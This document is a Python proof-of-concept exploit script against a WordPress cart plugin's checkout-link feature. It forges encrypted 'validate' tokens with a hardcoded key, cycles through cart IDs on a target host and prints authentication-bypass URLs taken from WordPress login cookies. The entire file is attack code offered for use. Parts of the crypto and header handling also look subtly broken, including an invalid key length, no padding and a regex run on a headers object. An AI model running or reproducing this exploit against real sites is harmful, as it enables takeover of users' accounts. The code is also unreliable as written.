import re
import sys
import urllib.parse
import urllib.request
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend


def fetch_url_content(url):
    try:
        response = urllib.request.urlopen(url)
        headers = response.info()
        body = response.read().decode('utf-8')
        status_code = response.getcode()
        
        return {
            'header': headers,
            'body': body,
            'status_code': status_code
        }
    except urllib.error.HTTPError as e:
        print('[-] Error:', str(e))
        return False
    except urllib.error.URLError as e:
        print('[-] Error:', str(e.reason))
        return False


def encrypt(data, key, key_size):
    backend = default_backend()
    iv = b'\x00' * 16  # Initialization vector (dummy value for example purposes)
    cipher = Cipher(algorithms.AES(key[:key_size]), modes.CBC(iv), backend=backend)
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(data.encode()) + encryptor.finalize()
    return encrypted_data


def exploit_link(host, port, cart_id, encryption_key):
    validate_val = str(cart_id) + '&url=' + host + ':' + str(port) + '/checkout/'
    encrypted_val = encrypt(validate_val, encryption_key, 256)
    params = urllib.parse.urlencode({'wcal_action': 'checkout_link', 'user_email': 'test', 'validate': encrypted_val})
    url = host + ':' + str(port) + '/?' + params
    
    result = fetch_url_content(url)
    
    if not result:
        return False
    
    if result['body'] == 'Link expired':
        return False
    else:
        matches = re.search(r'Set-Cookie:.*wordpress_.*=(.*?)%', result['header'])
        username = matches.group(1) if matches else None
        
        if username:
            print("[+] Authentication Bypass URL for user '" + username + "' : " + url)
            return True
        else:
            return False


if len(sys.argv) != 4:
    print("[-] Usage: python poc.py http://target_host target_port max_cart_id_to_enumerate")
    sys.exit(1)

host = sys.argv[1]
port = int(sys.argv[2])
max_id = int(sys.argv[3])

for cart_id in range(1, max_id + 1):
    print("[*] Enumerating cart ID:", cart_id)
    encryption_key = 'qJB0rGtIn5UB1xG03efyCp'  # Hardcoded encryption key
    res = exploit_link(host, port, cart_id, encryption_key)
    
    if not res:
        encryption_key = ''  # Empty encryption key
        res = exploit_link(host, port, cart_id, encryption_key)
